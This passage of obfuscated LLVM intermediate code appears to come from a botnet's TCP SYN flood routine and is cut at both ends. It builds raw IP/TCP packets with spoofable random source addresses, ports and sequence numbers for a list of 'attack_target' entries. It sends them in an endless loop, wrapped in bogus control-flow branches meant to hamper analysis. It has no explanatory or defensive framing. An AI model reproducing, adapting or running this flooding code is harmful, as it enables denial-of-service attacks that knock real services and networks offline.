  %125 = load i32, i32* %9, align 4
  %126 = load i8, i8* %5, align 1
  %127 = zext i8 %126 to i32
  %128 = icmp slt i32 %125, %127
  br i1 %128, label %129, label %336

; <label>:129:                                    ; preds = %124
  %130 = load i32, i32* @x.25
  %131 = load i32, i32* @y.26
  %132 = sub i32 %130, 1
  %133 = mul i32 %130, %132
  %134 = urem i32 %133, 2
  %135 = icmp eq i32 %134, 0
  %136 = icmp slt i32 %131, 10
  %137 = or i1 %135, %136
  br i1 %137, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %129
  %138 = call noalias i8* @calloc(i64 128, i64 1) #6
  %139 = load i8**, i8*** %11, align 8
  %140 = load i32, i32* %9, align 4
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds i8*, i8** %139, i64 %141
  store i8* %138, i8** %142, align 8
  %143 = load i8**, i8*** %11, align 8
  %144 = load i32, i32* %9, align 4
  %145 = sext i32 %144 to i64
  %146 = getelementptr inbounds i8*, i8** %143, i64 %145
  %147 = load i8*, i8** %146, align 8
  %148 = bitcast i8* %147 to %struct.iphdr*
  store %struct.iphdr* %148, %struct.iphdr** %27, align 8
  %149 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %150 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %149, i64 1
  %151 = bitcast %struct.iphdr* %150 to %struct.tcphdr*
  store %struct.tcphdr* %151, %struct.tcphdr** %28, align 8
  %152 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %153 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %152, i64 1
  %154 = bitcast %struct.tcphdr* %153 to i8*
  store i8* %154, i8** %29, align 8
  %155 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %156 = bitcast %struct.iphdr* %155 to i8*
  %157 = load i8, i8* %156, align 4
  %158 = and i8 %157, 15
  %159 = or i8 %158, 64
  store i8 %159, i8* %156, align 4
  %160 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %161 = bitcast %struct.iphdr* %160 to i8*
  %162 = load i8, i8* %161, align 4
  %163 = and i8 %162, -16
  %164 = or i8 %163, 5
  store i8 %164, i8* %161, align 4
  %165 = load i8, i8* %12, align 1
  %166 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %167 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %166, i32 0, i32 1
  store i8 %165, i8* %167, align 1
  %168 = call zeroext i16 @htons(i16 zeroext 60) #7
  %169 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %170 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %169, i32 0, i32 2
  store i16 %168, i16* %170, align 2
  %171 = load i16, i16* %13, align 2
  %172 = call zeroext i16 @htons(i16 zeroext %171) #7
  %173 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %174 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %173, i32 0, i32 3
  store i16 %172, i16* %174, align 4
  %175 = load i8, i8* %14, align 1
  %176 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %177 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %176, i32 0, i32 5
  store i8 %175, i8* %177, align 4
  %178 = load i8, i8* %15, align 1
  %179 = icmp ne i8 %178, 0
  %180 = load i32, i32* @x.25
  %181 = load i32, i32* @y.26
  %182 = sub i32 %180, 1
  %183 = mul i32 %180, %182
  %184 = urem i32 %183, 2
  %185 = icmp eq i32 %184, 0
  %186 = icmp slt i32 %181, 10
  %187 = or i1 %185, %186
  br i1 %187, label %originalBBpart233, label %originalBB1alteredBB

originalBBpart233:                                ; preds = %originalBB1
  br i1 %179, label %188, label %192

; <label>:188:                                    ; preds = %originalBBpart233
  %189 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %190 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %191 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %190, i32 0, i32 4
  store i16 %189, i16* %191, align 2
  br label %192

; <label>:192:                                    ; preds = %188, %originalBBpart233
  %193 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %194 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %193, i32 0, i32 6
  store i8 6, i8* %194, align 1
  %195 = load i32, i32* %26, align 4
  %196 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %197 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %196, i32 0, i32 8
  store i32 %195, i32* %197, align 4
  %198 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %199 = load i32, i32* %9, align 4
  %200 = sext i32 %199 to i64
  %201 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %198, i64 %200
  %202 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %201, i32 0, i32 1
  %203 = load i32, i32* %202, align 4
  %204 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %205 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %204, i32 0, i32 9
  store i32 %203, i32* %205, align 4
  %206 = load i16, i16* %16, align 2
  %207 = call zeroext i16 @htons(i16 zeroext %206) #7
  %208 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %209 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %208, i32 0, i32 0
  store i16 %207, i16* %209, align 4
  %210 = load i16, i16* %17, align 2
  %211 = call zeroext i16 @htons(i16 zeroext %210) #7
  %212 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %213 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %212, i32 0, i32 1
  store i16 %211, i16* %213, align 2
  %214 = load i32, i32* %18, align 4
  %215 = trunc i32 %214 to i16
  %216 = call zeroext i16 @htons(i16 zeroext %215) #7
  %217 = zext i16 %216 to i32
  %218 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %219 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %218, i32 0, i32 2
  store i32 %217, i32* %219, align 4
  %220 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %221 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %220, i32 0, i32 4
  %222 = load i16, i16* %221, align 4
  %223 = and i16 %222, -241
  %224 = or i16 %223, 160
  store i16 %224, i16* %221, align 4
  %225 = load i8, i8* %20, align 1
  %226 = sext i8 %225 to i16
  %227 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %228 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %227, i32 0, i32 4
  %229 = load i16, i16* %228, align 4
  %230 = and i16 %226, 1
  %231 = shl i16 %230, 13
  %232 = and i16 %229, -8193
  %233 = or i16 %232, %231
  store i16 %233, i16* %228, align 4
  %234 = load i8, i8* %21, align 1
  %235 = sext i8 %234 to i16
  %236 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %237 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %236, i32 0, i32 4
  %238 = load i16, i16* %237, align 4
  %239 = and i16 %235, 1
  %240 = shl i16 %239, 12
  %241 = and i16 %238, -4097
  %242 = or i16 %241, %240
  store i16 %242, i16* %237, align 4
  %243 = load i8, i8* %22, align 1
  %244 = sext i8 %243 to i16
  %245 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %246 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %245, i32 0, i32 4
  %247 = load i16, i16* %246, align 4
  %248 = and i16 %244, 1
  %249 = shl i16 %248, 11
  %250 = and i16 %247, -2049
  %251 = or i16 %250, %249
  store i16 %251, i16* %246, align 4
  %252 = load i8, i8* %23, align 1
  %253 = sext i8 %252 to i16
  %254 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %255 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %254, i32 0, i32 4
  %256 = load i16, i16* %255, align 4
  %257 = and i16 %253, 1
  %258 = shl i16 %257, 10
  %259 = and i16 %256, -1025
  %260 = or i16 %259, %258
  store i16 %260, i16* %255, align 4
  %261 = load i8, i8* %24, align 1
  %262 = sext i8 %261 to i16
  %263 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %264 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %263, i32 0, i32 4
  %265 = load i16, i16* %264, align 4
  %266 = and i16 %262, 1
  %267 = shl i16 %266, 9
  %268 = and i16 %265, -513
  %269 = or i16 %268, %267
  store i16 %269, i16* %264, align 4
  %270 = load i8, i8* %25, align 1
  %271 = sext i8 %270 to i16
  %272 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %273 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %272, i32 0, i32 4
  %274 = load i16, i16* %273, align 4
  %275 = and i16 %271, 1
  %276 = shl i16 %275, 8
  %277 = and i16 %274, -257
  %278 = or i16 %277, %276
  store i16 %278, i16* %273, align 4
  %279 = load i8*, i8** %29, align 8
  %280 = getelementptr inbounds i8, i8* %279, i32 1
  store i8* %280, i8** %29, align 8
  store i8 2, i8* %279, align 1
  %281 = load i8*, i8** %29, align 8
  %282 = getelementptr inbounds i8, i8* %281, i32 1
  store i8* %282, i8** %29, align 8
  store i8 4, i8* %281, align 1
  %283 = call i32 @rand_next()
  %284 = and i32 %283, 15
  %285 = add i32 1400, %284
  %286 = trunc i32 %285 to i16
  %287 = call zeroext i16 @htons(i16 zeroext %286) #7
  %288 = load i8*, i8** %29, align 8
  %289 = bitcast i8* %288 to i16*
  store i16 %287, i16* %289, align 2
  %290 = load i8*, i8** %29, align 8
  %291 = getelementptr inbounds i8, i8* %290, i64 2
  store i8* %291, i8** %29, align 8
  %292 = load i8*, i8** %29, align 8
  %293 = getelementptr inbounds i8, i8* %292, i32 1
  store i8* %293, i8** %29, align 8
  store i8 4, i8* %292, align 1
  %294 = load i8*, i8** %29, align 8
  %295 = getelementptr inbounds i8, i8* %294, i32 1
  store i8* %295, i8** %29, align 8
  store i8 2, i8* %294, align 1
  %296 = load i8*, i8** %29, align 8
  %297 = getelementptr inbounds i8, i8* %296, i32 1
  store i8* %297, i8** %29, align 8
  store i8 8, i8* %296, align 1
  %298 = load i8*, i8** %29, align 8
  %299 = getelementptr inbounds i8, i8* %298, i32 1
  store i8* %299, i8** %29, align 8
  store i8 10, i8* %298, align 1
  %300 = call i32 @rand_next()
  %301 = load i8*, i8** %29, align 8
  %302 = bitcast i8* %301 to i32*
  store i32 %300, i32* %302, align 4
  %303 = load i8*, i8** %29, align 8
  %304 = getelementptr inbounds i8, i8* %303, i64 4
  store i8* %304, i8** %29, align 8
  %305 = load i8*, i8** %29, align 8
  %306 = bitcast i8* %305 to i32*
  store i32 0, i32* %306, align 4
  %307 = load i8*, i8** %29, align 8
  %308 = getelementptr inbounds i8, i8* %307, i64 4
  store i8* %308, i8** %29, align 8
  %309 = load i8*, i8** %29, align 8
  %310 = getelementptr inbounds i8, i8* %309, i32 1
  store i8* %310, i8** %29, align 8
  store i8 1, i8* %309, align 1
  %311 = load i8*, i8** %29, align 8
  %312 = getelementptr inbounds i8, i8* %311, i32 1
  store i8* %312, i8** %29, align 8
  store i8 3, i8* %311, align 1
  %313 = load i8*, i8** %29, align 8
  %314 = getelementptr inbounds i8, i8* %313, i32 1
  store i8* %314, i8** %29, align 8
  store i8 3, i8* %313, align 1
  %315 = load i8*, i8** %29, align 8
  %316 = getelementptr inbounds i8, i8* %315, i32 1
  store i8* %316, i8** %29, align 8
  store i8 6, i8* %315, align 1
  br label %317

; <label>:317:                                    ; preds = %192
  %318 = load i32, i32* @x.25
  %319 = load i32, i32* @y.26
  %320 = sub i32 %318, 1
  %321 = mul i32 %318, %320
  %322 = urem i32 %321, 2
  %323 = icmp eq i32 %322, 0
  %324 = icmp slt i32 %319, 10
  %325 = or i1 %323, %324
  br i1 %325, label %originalBB35, label %originalBB35alteredBB

originalBB35:                                     ; preds = %originalBB35alteredBB, %317
  %326 = load i32, i32* %9, align 4
  %327 = add nsw i32 %326, 1
  store i32 %327, i32* %9, align 4
  %328 = load i32, i32* @x.25
  %329 = load i32, i32* @y.26
  %330 = sub i32 %328, 1
  %331 = mul i32 %328, %330
  %332 = urem i32 %331, 2
  %333 = icmp eq i32 %332, 0
  %334 = icmp slt i32 %329, 10
  %335 = or i1 %333, %334
  br i1 %335, label %originalBBpart244, label %originalBB35alteredBB

originalBBpart244:                                ; preds = %originalBB35
  br label %124

; <label>:336:                                    ; preds = %124
  br label %337

; <label>:337:                                    ; preds = %612, %336
  %338 = load i32, i32* @x.25
  %339 = load i32, i32* @y.26
  %340 = sub i32 %338, 1
  %341 = mul i32 %338, %340
  %342 = urem i32 %341, 2
  %343 = icmp eq i32 %342, 0
  %344 = icmp slt i32 %339, 10
  %345 = or i1 %343, %344
  br i1 %345, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %337
  store i32 0, i32* %9, align 4
  %346 = load i32, i32* @x.25
  %347 = load i32, i32* @y.26
  %348 = sub i32 %346, 1
  %349 = mul i32 %346, %348
  %350 = urem i32 %349, 2
  %351 = icmp eq i32 %350, 0
  %352 = icmp slt i32 %347, 10
  %353 = or i1 %351, %352
  br i1 %353, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br label %354

; <label>:354:                                    ; preds = %609, %originalBBpart248
  %355 = load i32, i32* @x.25
  %356 = load i32, i32* @y.26
  %357 = sub i32 %355, 1
  %358 = mul i32 %355, %357
  %359 = urem i32 %358, 2
  %360 = icmp eq i32 %359, 0
  %361 = icmp slt i32 %356, 10
  %362 = or i1 %360, %361
  br i1 %362, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %354
  %363 = load i32, i32* %9, align 4
  %364 = load i8, i8* %5, align 1
  %365 = zext i8 %364 to i32
  %366 = icmp slt i32 %363, %365
  %367 = load i32, i32* @x.25
  %368 = load i32, i32* @y.26
  %369 = sub i32 %367, 1
  %370 = mul i32 %367, %369
  %371 = urem i32 %370, 2
  %372 = icmp eq i32 %371, 0
  %373 = icmp slt i32 %368, 10
  %374 = or i1 %372, %373
  br i1 %374, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br i1 %366, label %375, label %612

; <label>:375:                                    ; preds = %originalBBpart252
  %376 = load i8**, i8*** %11, align 8
  %377 = load i32, i32* %9, align 4
  %378 = sext i32 %377 to i64
  %379 = getelementptr inbounds i8*, i8** %376, i64 %378
  %380 = load i8*, i8** %379, align 8
  store i8* %380, i8** %30, align 8
  %381 = load i8*, i8** %30, align 8
  %382 = bitcast i8* %381 to %struct.iphdr*
  store %struct.iphdr* %382, %struct.iphdr** %31, align 8
  %383 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %384 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %383, i64 1
  %385 = bitcast %struct.iphdr* %384 to %struct.tcphdr*
  store %struct.tcphdr* %385, %struct.tcphdr** %32, align 8
  %386 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %387 = load i32, i32* %9, align 4
  %388 = sext i32 %387 to i64
  %389 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %386, i64 %388
  %390 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %389, i32 0, i32 2
  %391 = load i8, i8* %390, align 4
  %392 = zext i8 %391 to i32
  %393 = icmp slt i32 %392, 32
  br i1 %393, label %394, label %415

; <label>:394:                                    ; preds = %375
  %395 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %396 = load i32, i32* %9, align 4
  %397 = sext i32 %396 to i64
  %398 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %395, i64 %397
  %399 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %398, i32 0, i32 1
  %400 = load i32, i32* %399, align 4
  %401 = call i32 @ntohl(i32 %400) #7
  %402 = call i32 @rand_next()
  %403 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %404 = load i32, i32* %9, align 4
  %405 = sext i32 %404 to i64
  %406 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %403, i64 %405
  %407 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %406, i32 0, i32 2
  %408 = load i8, i8* %407, align 4
  %409 = zext i8 %408 to i32
  %410 = lshr i32 %402, %409
  %411 = add i32 %401, %410
  %412 = call i32 @htonl(i32 %411) #7
  %413 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %414 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %413, i32 0, i32 9
  store i32 %412, i32* %414, align 4
  br label %415

; <label>:415:                                    ; preds = %394, %375
  %416 = load i32, i32* %26, align 4
  %417 = icmp eq i32 %416, -1
  br i1 %417, label %418, label %422

; <label>:418:                                    ; preds = %415
  %419 = call i32 @rand_next()
  %420 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %421 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %420, i32 0, i32 8
  store i32 %419, i32* %421, align 4
  br label %422

; <label>:422:                                    ; preds = %418, %415
  %423 = load i32, i32* @x.25
  %424 = load i32, i32* @y.26
  %425 = sub i32 %423, 1
  %426 = mul i32 %423, %425
  %427 = urem i32 %426, 2
  %428 = icmp eq i32 %427, 0
  %429 = icmp slt i32 %424, 10
  %430 = or i1 %428, %429
  br i1 %430, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %422
  %431 = load i16, i16* %13, align 2
  %432 = zext i16 %431 to i32
  %433 = icmp eq i32 %432, 65535
  %434 = load i32, i32* @x.25
  %435 = load i32, i32* @y.26
  %436 = sub i32 %434, 1
  %437 = mul i32 %434, %436
  %438 = urem i32 %437, 2
  %439 = icmp eq i32 %438, 0
  %440 = icmp slt i32 %435, 10
  %441 = or i1 %439, %440
  br i1 %441, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br i1 %433, label %442, label %464

; <label>:442:                                    ; preds = %originalBBpart256
  %443 = load i32, i32* @x.25
  %444 = load i32, i32* @y.26
  %445 = sub i32 %443, 1
  %446 = mul i32 %443, %445
  %447 = urem i32 %446, 2
  %448 = icmp eq i32 %447, 0
  %449 = icmp slt i32 %444, 10
  %450 = or i1 %448, %449
  br i1 %450, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %442
  %451 = call i32 @rand_next()
  %452 = and i32 %451, 65535
  %453 = trunc i32 %452 to i16
  %454 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %455 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %454, i32 0, i32 3
  store i16 %453, i16* %455, align 4
  %456 = load i32, i32* @x.25
  %457 = load i32, i32* @y.26
  %458 = sub i32 %456, 1
  %459 = mul i32 %456, %458
  %460 = urem i32 %459, 2
  %461 = icmp eq i32 %460, 0
  %462 = icmp slt i32 %457, 10
  %463 = or i1 %461, %462
  br i1 %463, label %originalBBpart265, label %originalBB58alteredBB

originalBBpart265:                                ; preds = %originalBB58
  br label %464

; <label>:464:                                    ; preds = %originalBBpart265, %originalBBpart256
  %465 = load i32, i32* @x.25
  %466 = load i32, i32* @y.26
  %467 = sub i32 %465, 1
  %468 = mul i32 %465, %467
  %469 = urem i32 %468, 2
  %470 = icmp eq i32 %469, 0
  %471 = icmp slt i32 %466, 10
  %472 = or i1 %470, %471
  br i1 %472, label %originalBB67, label %originalBB67alteredBB

originalBB67:                                     ; preds = %originalBB67alteredBB, %464
  %473 = load i16, i16* %16, align 2
  %474 = zext i16 %473 to i32
  %475 = icmp eq i32 %474, 65535
  %476 = load i32, i32* @x.25
  %477 = load i32, i32* @y.26
  %478 = sub i32 %476, 1
  %479 = mul i32 %476, %478
  %480 = urem i32 %479, 2
  %481 = icmp eq i32 %480, 0
  %482 = icmp slt i32 %477, 10
  %483 = or i1 %481, %482
  br i1 %483, label %originalBBpart269, label %originalBB67alteredBB

originalBBpart269:                                ; preds = %originalBB67
  br i1 %475, label %484, label %490

; <label>:484:                                    ; preds = %originalBBpart269
  %485 = call i32 @rand_next()
  %486 = and i32 %485, 65535
  %487 = trunc i32 %486 to i16
  %488 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %489 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %488, i32 0, i32 0
  store i16 %487, i16* %489, align 4
  br label %490

; <label>:490:                                    ; preds = %484, %originalBBpart269
  %491 = load i32, i32* @x.25
  %492 = load i32, i32* @y.26
  %493 = sub i32 %491, 1
  %494 = mul i32 %491, %493
  %495 = urem i32 %494, 2
  %496 = icmp eq i32 %495, 0
  %497 = icmp slt i32 %492, 10
  %498 = or i1 %496, %497
  br i1 %498, label %originalBB71, label %originalBB71alteredBB

originalBB71:                                     ; preds = %originalBB71alteredBB, %490
  %499 = load i16, i16* %17, align 2
  %500 = zext i16 %499 to i32
  %501 = icmp eq i32 %500, 65535
  %502 = load i32, i32* @x.25
  %503 = load i32, i32* @y.26
  %504 = sub i32 %502, 1
  %505 = mul i32 %502, %504
  %506 = urem i32 %505, 2
  %507 = icmp eq i32 %506, 0
  %508 = icmp slt i32 %503, 10
  %509 = or i1 %507, %508
  br i1 %509, label %originalBBpart273, label %originalBB71alteredBB

originalBBpart273:                                ; preds = %originalBB71
  br i1 %501, label %510, label %532

; <label>:510:                                    ; preds = %originalBBpart273
  %511 = load i32, i32* @x.25
  %512 = load i32, i32* @y.26
  %513 = sub i32 %511, 1
  %514 = mul i32 %511, %513
  %515 = urem i32 %514, 2
  %516 = icmp eq i32 %515, 0
  %517 = icmp slt i32 %512, 10
  %518 = or i1 %516, %517
  br i1 %518, label %originalBB75, label %originalBB75alteredBB

originalBB75:                                     ; preds = %originalBB75alteredBB, %510
  %519 = call i32 @rand_next()
  %520 = and i32 %519, 65535
  %521 = trunc i32 %520 to i16
  %522 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %523 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %522, i32 0, i32 1
  store i16 %521, i16* %523, align 2
  %524 = load i32, i32* @x.25
  %525 = load i32, i32* @y.26
  %526 = sub i32 %524, 1
  %527 = mul i32 %524, %526
  %528 = urem i32 %527, 2
  %529 = icmp eq i32 %528, 0
  %530 = icmp slt i32 %525, 10
  %531 = or i1 %529, %530
  br i1 %531, label %originalBBpart289, label %originalBB75alteredBB

originalBBpart289:                                ; preds = %originalBB75
  br label %532

; <label>:532:                                    ; preds = %originalBBpart289, %originalBBpart273
  %533 = load i32, i32* %18, align 4
  %534 = icmp eq i32 %533, 65535
  br i1 %534, label %535, label %539

; <label>:535:                                    ; preds = %532
  %536 = call i32 @rand_next()
  %537 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %538 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %537, i32 0, i32 2
  store i32 %536, i32* %538, align 4
  br label %539

; <label>:539:                                    ; preds = %535, %532
  %540 = load i32, i32* @x.25
  %541 = load i32, i32* @y.26
  %542 = sub i32 %540, 1
  %543 = mul i32 %540, %542
  %544 = urem i32 %543, 2
  %545 = icmp eq i32 %544, 0
  %546 = icmp slt i32 %541, 10
  %547 = or i1 %545, %546
  br i1 %547, label %originalBB91, label %originalBB91alteredBB

originalBB91:                                     ; preds = %originalBB91alteredBB, %539
  %548 = load i32, i32* %19, align 4
  %549 = icmp eq i32 %548, 65535
  %550 = load i32, i32* @x.25
  %551 = load i32, i32* @y.26
  %552 = sub i32 %550, 1
  %553 = mul i32 %550, %552
  %554 = urem i32 %553, 2
  %555 = icmp eq i32 %554, 0
  %556 = icmp slt i32 %551, 10
  %557 = or i1 %555, %556
  br i1 %557, label %originalBBpart293, label %originalBB91alteredBB

originalBBpart293:                                ; preds = %originalBB91
  br i1 %549, label %558, label %562

; <label>:558:                                    ; preds = %originalBBpart293
  %559 = call i32 @rand_next()
  %560 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %561 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %560, i32 0, i32 3
  store i32 %559, i32* %561, align 4
  br label %562

; <label>:562:                                    ; preds = %558, %originalBBpart293
  %563 = load i8, i8* %20, align 1
  %564 = icmp ne i8 %563, 0
  br i1 %564, label %565, label %571

; <label>:565:                                    ; preds = %562
  %566 = call i32 @rand_next()
  %567 = and i32 %566, 65535
  %568 = trunc i32 %567 to i16
  %569 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %570 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %569, i32 0, i32 7
  store i16 %568, i16* %570, align 2
  br label %571

; <label>:571:                                    ; preds = %565, %562
  %572 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %573 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %572, i32 0, i32 7
  store i16 0, i16* %573, align 2
  %574 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %575 = bitcast %struct.iphdr* %574 to i16*
  %576 = call zeroext i16 @checksum_generic(i16* %575, i32 20)
  %577 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %578 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %577, i32 0, i32 7
  store i16 %576, i16* %578, align 2
  %579 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %580 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %579, i32 0, i32 6
  store i16 0, i16* %580, align 4
  %581 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %582 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %583 = bitcast %struct.tcphdr* %582 to i8*
  %584 = call zeroext i16 @htons(i16 zeroext 40) #7
  %585 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %581, i8* %583, i16 zeroext %584, i32 40)
  %586 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %587 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %586, i32 0, i32 6
  store i16 %585, i16* %587, align 4
  %588 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %589 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %588, i32 0, i32 1
  %590 = load i16, i16* %589, align 2
  %591 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %592 = load i32, i32* %9, align 4
  %593 = sext i32 %592 to i64
  %594 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %591, i64 %593
  %595 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %594, i32 0, i32 0
  %596 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %595, i32 0, i32 1
  store i16 %590, i16* %596, align 2
  %597 = load i32, i32* %10, align 4
  %598 = load i8*, i8** %30, align 8
  %599 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %600 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %601 = load i32, i32* %9, align 4
  %602 = sext i32 %601 to i64
  %603 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %600, i64 %602
  %604 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %603, i32 0, i32 0
  %605 = bitcast %struct.sockaddr_in* %604 to %struct.sockaddr*
  store %struct.sockaddr* %605, %struct.sockaddr** %599, align 8
  %606 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %607 = load %struct.sockaddr*, %struct.sockaddr** %606, align 8
  %608 = call i64 @sendto(i32 %597, i8* %598, i64 60, i32 16384, %struct.sockaddr* %607, i32 16)
  br label %609

; <label>:609:                                    ; preds = %571
  %610 = load i32, i32* %9, align 4
  %611 = add nsw i32 %610, 1
  store i32 %611, i32* %9, align 4
  br label %354

; <label>:612:                                    ; preds = %originalBBpart252
  br label %337

; <label>:613:                                    ; preds = %120, %originalBBpart2
  %614 = load i32, i32* @x.25
  %615 = load i32, i32* @y.26
  %616 = sub i32 %614, 1
  %617 = mul i32 %614, %616
  %618 = urem i32 %617, 2
  %619 = icmp eq i32 %618, 0
  %620 = icmp slt i32 %615, 10
  %621 = or i1 %619, %620
  br i1 %621, label %originalBB95, label %originalBB95alteredBB

originalBB95:                                     ; preds = %originalBB95alteredBB, %613
  %622 = load i32, i32* @x.25
  %623 = load i32, i32* @y.26
  %624 = sub i32 %622, 1
  %625 = mul i32 %622, %624
  %626 = urem i32 %625, 2
  %627 = icmp eq i32 %626, 0
  %628 = icmp slt i32 %623, 10
  %629 = or i1 %627, %628
  br i1 %629, label %originalBBpart297, label %originalBB95alteredBB

originalBBpart297:                                ; preds = %originalBB95
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %98
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %129
  %630 = call noalias i8* @calloc(i64 128, i64 1) #6
  %631 = load i8**, i8*** %11, align 8
  %632 = load i32, i32* %9, align 4
  %633 = sext i32 %632 to i64
  %634 = getelementptr inbounds i8*, i8** %631, i64 %633
  store i8* %630, i8** %634, align 8
  %635 = load i8**, i8*** %11, align 8
  %636 = load i32, i32* %9, align 4
  %637 = sext i32 %636 to i64
  %638 = getelementptr inbounds i8*, i8** %635, i64 %637
  %639 = load i8*, i8** %638, align 8
  %640 = bitcast i8* %639 to %struct.iphdr*
  store %struct.iphdr* %640, %struct.iphdr** %27, align 8
  %641 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %642 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %641, i64 1
  %643 = bitcast %struct.iphdr* %642 to %struct.tcphdr*
  store %struct.tcphdr* %643, %struct.tcphdr** %28, align 8
  %644 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %645 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %644, i64 1
  %646 = bitcast %struct.tcphdr* %645 to i8*
  store i8* %646, i8** %29, align 8
  %647 = load %struct.iphdr*, %struct.iphdr** %27, align 8
